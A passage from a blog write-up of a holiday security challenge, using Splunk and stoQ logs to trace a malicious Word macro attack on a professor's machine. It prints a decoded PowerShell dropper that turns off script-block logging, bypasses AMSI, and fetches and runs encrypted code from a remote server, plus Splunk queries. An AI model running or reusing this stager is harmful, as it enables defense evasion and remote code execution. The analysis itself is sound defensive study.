jBBRUVBV3dBd0FDNEFMZ0F6QUYwQU93QWtBRVFBWVFCMEFFRUFQUUFrQUdRQVFRQlVBR0VBV3dBMEFDNEFMZ0FrQUVRQVlRQjBBRUVBTGdCc0FFVUFUZ0JIQUhRQVNBQmRBRHNBTFFCS0FFOEFTUUJPQUZzQVF3Qm9BR0VBVWdCYkFGMEFYUUFvQUNZQUlBQWtBRklBSUFBa0FFUUFZUUIwQUVFQUlBQW9BQ1FBU1FCV0FDc0FKQUJMQUNrQUtRQjhBRWtBUlFCWUFBPT0)">put it into cyberchef and experiment with the character encoding</a> we eventually get this powershell script:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$PSVerSioNTaBLe</span>.PSVERsIOn.MAJor <span class="operator">-gE</span> <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="variable">$GPF</span>=[<span class="type">Ref</span>].ASsEMBly.GETTyPE(<span class="string">'System.Management.Automation.Utils'</span>).<span class="string">"GEtFiE`Ld"</span>(<span class="string">'cachedGroupPolicySettings'</span>,<span class="string">'N'</span>+<span class="string">'onPublic,Static'</span>);</span><br><span class="line">    <span class="keyword">IF</span>(<span class="variable">$GPF</span>)&#123;</span><br><span class="line">        <span class="variable">$GPC</span>=<span class="variable">$GPF</span>.GeTVAluE(<span class="variable">$nUlL</span>);</span><br><span class="line">        <span class="keyword">If</span>(<span class="variable">$GPC</span>[<span class="string">'ScriptB'</span>+<span class="string">'lockLogging'</span>])&#123;</span><br><span class="line">            <span class="variable">$GPC</span>[<span class="string">'ScriptB'</span>+<span class="string">'lockLogging'</span>][<span class="string">'EnableScriptB'</span>+<span class="string">'lockLogging'</span>]=<span class="number">0</span>;</span><br><span class="line">            <span class="variable">$GPC</span>[<span class="string">'ScriptB'</span>+<span class="string">'lockLogging'</span>][<span class="string">'EnableScriptBlockInvocationLogging'</span>]=<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$val</span>=[<span class="type">COLlEcTioNs.GEneRiC.DICTIoNAry</span>[<span class="built_in">StrING</span>,<span class="type">SySTEm.ObjecT</span>]]::NeW();</span><br><span class="line">        <span class="variable">$vAl</span>.AdD(<span class="string">'EnableScriptB'</span>+<span class="string">'lockLogging'</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="variable">$vaL</span>.ADd(<span class="string">'EnableScriptBlockInvocationLogging'</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="variable">$GPC</span>[<span class="string">'HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'</span>+<span class="string">'lockLogging'</span>]=<span class="variable">$VAl</span></span><br><span class="line">    &#125;<span class="keyword">ElSE</span>&#123;</span><br><span class="line">        [<span class="type">SCrIPTBlOCK</span>].<span class="string">"GEtFIe`lD"</span>(<span class="string">'signatures'</span>,<span class="string">'N'</span>+<span class="string">'onPublic,Static'</span>).SETVALUe(<span class="variable">$NUll</span>,(<span class="built_in">NEW-OBjEct</span> CollEcTions.GEnerIC.HashSeT[<span class="built_in">sTrING</span>]))</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="type">REf</span>].ASSEMBlY.GETTYPe(<span class="string">'System.Management.Automation.AmsiUtils'</span>)|?&#123;<span class="variable">$_</span>&#125;|%&#123;<span class="variable">$_</span>.GETFielD(<span class="string">'amsiInitFailed'</span>,<span class="string">'NonPublic,Static'</span>).SEtValUe(<span class="variable">$NUlL</span>,<span class="variable">$True</span>)&#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">[<span class="type">SySteM.NeT.SERvicEPoInTMaNaGer</span>]::EXPecT100<span class="keyword">CONtInUe</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$wc</span>=<span class="built_in">NEw-ObjECT</span> SysTEM.NeT.WeBCLiENT;</span><br><span class="line"><span class="variable">$u</span>=<span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'</span>;</span><br><span class="line"><span class="variable">$wC</span>.HEADErS.ADd(<span class="string">'User-Agent'</span>,<span class="variable">$u</span>);</span><br><span class="line"><span class="variable">$Wc</span>.ProXy=[<span class="type">SySTeM.Net.WeBREQuEST</span>]::DEFaULTWebProXy;</span><br><span class="line"><span class="variable">$WC</span>.PRoXy.CREDenTIAls = [<span class="type">SySTEm.NET.CRedeNTiAlCAcHe</span>]::DeFaulTNeTwORkCREDenTiALS;</span><br><span class="line"><span class="variable">$Script:Proxy</span> = <span class="variable">$wc</span>.Proxy;</span><br><span class="line"><span class="variable">$K</span>=[<span class="type">SySTEM.Text.EncOdING</span>]::ASCII.GeTBYteS(<span class="string">'zd!Pmw3J/qnuWoHX~=g.&#123;&gt;p,GE]:|#MR'</span>);<span class="variable">$R</span>=&#123;<span class="variable">$D</span>,<span class="variable">$K</span>=<span class="variable">$ARGs</span>;<span class="variable">$S</span>=<span class="number">0</span>..<span class="number">255</span>;<span class="number">0</span>..<span class="number">255</span>|%&#123;<span class="variable">$J</span>=(<span class="variable">$J</span>+<span class="variable">$S</span>[<span class="variable">$_</span>]+<span class="variable">$K</span>[<span class="variable">$_</span>%<span class="variable">$K</span><span class="type">.COUnt</span>])%<span class="number">256</span>;<span class="variable">$S</span>[<span class="variable">$_</span>],<span class="variable">$S</span>[<span class="variable">$J</span>]=<span class="variable">$S</span>[<span class="variable">$J</span>],<span class="variable">$S</span>[<span class="variable">$_</span>]&#125;;<span class="variable">$D</span>|%&#123;<span class="variable">$I</span>=(<span class="variable">$I</span>+<span class="number">1</span>)%<span class="number">256</span>;<span class="variable">$H</span>=(<span class="variable">$H</span>+<span class="variable">$S</span>[<span class="variable">$I</span>])%<span class="number">256</span>;<span class="variable">$S</span>[<span class="variable">$I</span>],<span class="variable">$S</span>[<span class="variable">$H</span>]=<span class="variable">$S</span>[<span class="variable">$H</span>],<span class="variable">$S</span>[<span class="variable">$I</span>];<span class="variable">$_</span><span class="operator">-BXoR</span><span class="variable">$S</span>[(<span class="variable">$S</span>[<span class="variable">$I</span>]+<span class="variable">$S</span>[<span class="variable">$H</span>])%<span class="number">256</span>]&#125;&#125;&#125;<span class="string">');</span></span><br><span class="line"><span class="string">$ser='</span>http://<span class="number">144.202</span>.<span class="number">46.214</span>:<span class="number">8080</span><span class="string">';</span></span><br><span class="line"><span class="string">$t='</span>/admin/get.php<span class="string">';</span></span><br><span class="line"><span class="string">$WC.HEADErs.Add("Cookie","session=reT9XQAl0EMJnxukEZy/7MS70X4=");</span></span><br><span class="line"><span class="string">$DATa=$WC.DownlOADDAtA($sEr+$T);</span></span><br><span class="line"><span class="string">$Iv=$DatA[0..3];</span></span><br><span class="line"><span class="string">$DatA=$dATa[4..$DatA.lENGtH];</span></span><br><span class="line"><span class="string">-JOIN[ChaR[]](&amp; $R $DatA ($IV+$K))|IEX.</span></span><br></pre></td></tr></table></figure>

<p>(cleaned up just a bit)</p>
<p>Some of this seems garbled but it’s enough that we can tell what’s happening. We see an HTTP request to <code>http://144.202.46.214:8080/admin/get.php</code>, which we then cut a bit and assing to <code>$Data</code>. Then we do some manipulation with it and the first 4 bytes before eventually piping it (presumably decoded) into IEX / <code>Invoke-Expression</code>. This is basically just a dropper that executes some powershell code it gets from that server. We can’t look at exactly what code it executes, but we can get a rough idea by searching for <code>host=&quot;sweetums&quot; source=&quot;WinEventLog:Microsoft-Windows-Powershell/Operational&quot;</code>. Most of what we see is invocations of basic powershell commands, ForEach, Get and Where. The most common by far is ForEach, so let’s start by looking at calls to <code>ForEach</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host&#x3D;&quot;sweetums&quot; source&#x3D;&quot;WinEventLog:Microsoft-Windows-Powershell&#x2F;Operational&quot; ParameterBinding_ForEach_Object_&#x3D;&quot;*&quot;</span><br></pre></td></tr></table></figure>

<p>By looking at the events we can see one interesting field:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParameterBinding(ForEach-Object): name&#x3D;&quot;Process&quot;; value&#x3D;&quot;$wc.Headers.Add($_.Name, $_.Value)&quot;</span><br></pre></td></tr></table></figure>

<p>Looking at it closer in the sidebar we see most of the values for it are just numbers. At a guess, this is from when the dropper decodes the data. We can look for more interesting events by filtering for rare values: <code>| rare limit=20 ParameterBinding_ForEach_Object_</code>. We see a couple file paths which is being used as an InputObject to some for loop, however one stands out:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&quot;InputObject&quot;; value&#x3D;&quot;C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt&quot;</span><br></pre></td></tr></table></figure>

<p>It’s safe to assume the code is looping over all the contents of a folder and exfiltrating them somehow, so our answer is <code>C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt</code>.</p>
<h1 id="Question-3"><a href="#Question-3" class="headerlink" title="Question 3"></a>Question 3</h1><blockquote>
<p>What is the fully-qualified domain name(FQDN) of the command and control(C2) server?</p>
</blockquote>
<p>We can search for network events (id 3) and then look at common destination hostnames:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EventID&#x3D;&quot;3&quot; | top dest_host</span><br></pre></td></tr></table></figure>

<p>Only one result is returned which makes up all of our (logged) network requests: <code>144.202.46.214.vultr.com</code></p>
<h1 id="Question-4"><a href="#Question-4" class="headerlink" title="Question 4"></a>Question 4</h1><blockquote>
<p>What document is involved with launching the malicious PowerShell code?</p>
</blockquote>
<p>Since we’re told it’s a malicious document, let’s start by looking for macro-enabled documents with a plaintext search <code>docm</code>.</p>
<p>The second event we see is a process create, where WINWORD.exe opens <code>C:\Windows\Temp\Temp1_Buttercups_HOL404_assignment (002).zip\19th Century Holiday Cheer Assignment.docm</code>, so our answer is <code>19th Century Holiday Cheer Assignment.docm</code>.</p>
<h1 id="Question-5"><a href="#Question-5" class="headerlink" title="Question 5"></a>Question 5</h1><blockquote>
<p>How many unique email addresses were used to send Holiday Cheer essays to Professor Banas?</p>
</blockquote>
<p>For this we want to look at stoq analysis rather than events from the host, so we use <code>sourcetype=&quot;stoq&quot;</code>. </p>
<p>First up, We only want to look at emails to/from the professor. If we look at the first event, we see that somewhere in the <code>results</code> array we have an object where <code>workers.smtp.to</code> is <code>carl.banas@faculty.elfu.org</code>. Since some clients might include contact names or capitalise differently, we search a little more vaguely:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">results&#123;&#125;.workers.smtp.to&#x3D;&quot;*carl.banas@faculty.elfu.org*&quot;</span><br></pre></td></tr></table></figure>

<p>Now we should filter only emails which have the right subject line, which Alice tells us is <code>Holiday Cheer Assignment Submission</code>: <code>results{}.workers.smtp.subject=&quot;Holiday Cheer Assignment Submission&quot;</code>.</p>
<p>Now we just need to look at all the different senders, which we can do with <code>| top results{}.workers.smtp.from</code>. We end up with 21 results, which is the answer to the question.</p>
<h1 id="Question-6"><a href="#Question-6" class="headerlink" title="Question 6"></a>Question 6</h1><blockquote>
<p>What was the password for the zip archive that contained the suspicious file?</p>
</blockquote>
<p>To start with, let’s look for the zip file. Stoq puts attachment filenames in <code>payload_meta.extra_data.filename</code> so we can search for zip attachments with <code>&quot;results{}.payload_meta.extra_data.filename&quot;=&quot;*.zip&quot;</code>. If we look at the body of this message, we get:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Professor Banas, I have completed my assignment. Please open the attached zip file with password 123456789 and then open the word document to view it. You will have to click &quot;Enable Editing&quot; then &quot;Enable Content&quot; to see it. This was a fun assignment. I hope you like it!  --Bradly Buttercups</span><br></pre></td></tr></table></figure>

<p>So the password is 123456789. </p>
<h1 id="Question-7"><a href="#Question-7" class="headerlink" title="Question 7"></a>Question 7</h1><blockquote>
<p>What email address did the suspicious file come from? </p>
</blockquote>
<p>From the last search, <code>Bradly.Buttercups@elfu.org</code>.</p>
<h1 id="Final-Question"><a href="#Final-Question" class="headerlink" title="Final Question"></a>Final Question</h1><blockquote>
<p>What was the message for Kent that the adversary embedded in this attack? </p>
</blockquote>
<p>Alice gives us a big filter thing which we can put at the end of our last search to get a neat output of the extracted files from this message.</p>
<p>We can actually download these files from <code>https://elfu-soc.s3.amazonaws.com/stoQ%20Artifacts/&lt;fullpath&gt;</code>. If we look at the extracted docm it tells us it’s been cleaned up and to look for the core.xml instead. We download that file the same way and find the document description:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kent you are so unfair. And we were going to make you the king of the Winter Carnival.</span><br></pre></td></tr></table></figure>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/archives/">Recent</a></li>
         
          <li><a href="https://github.com/tcmal" target="_blank" rel="noopener">GitHub</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Question-1"><span class="toc-number">1.</span> <span class="toc-text">Question 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Question-2"><span class="toc-number">2.</span> <span class="toc-text">Question 2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Question-3"><span class="toc-number">3.</span> <span class="toc-text">Question 3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Question-4"><span class="toc-number">4.</span> <span class="toc-text">Question 4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Question-5"><span class="toc-number">5.</span> <span class="toc-text">Question 5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Question-6"><span class="toc-number">6.</span> <span class="toc-text">Question 6</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Question-7"><span class="toc-number">7.</span> <span class="toc-text">Question 7</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Final-Question"><span class="toc-number">8.</span> <span class="toc-text">Final Question</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://tcmal.xyz/splunk/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://tcmal.xyz/splunk/&text=Splunk" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://tcmal.xyz/splunk/&title=Splunk" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://tcmal.xyz/splunk/&is_video=false&description=Splunk" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Splunk&body=Check out this article: http://tcmal.xyz/splunk/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://tcmal.xyz/splunk/&title=Splunk" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://tcmal.xyz/splunk/&title=Splunk" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://tcmal.xyz/splunk/&title=Splunk" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://tcmal.xyz/splunk/&title=Splunk" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://tcmal.xyz/splunk/&name=Splunk&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://tcmal.xyz/splunk/&t=Splunk" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2019-2020
    tcmal
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/archives/">Recent</a></li>
         
          <li><a href="https://github.com/tcmal" target="_blank" rel="noopener">GitHub</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
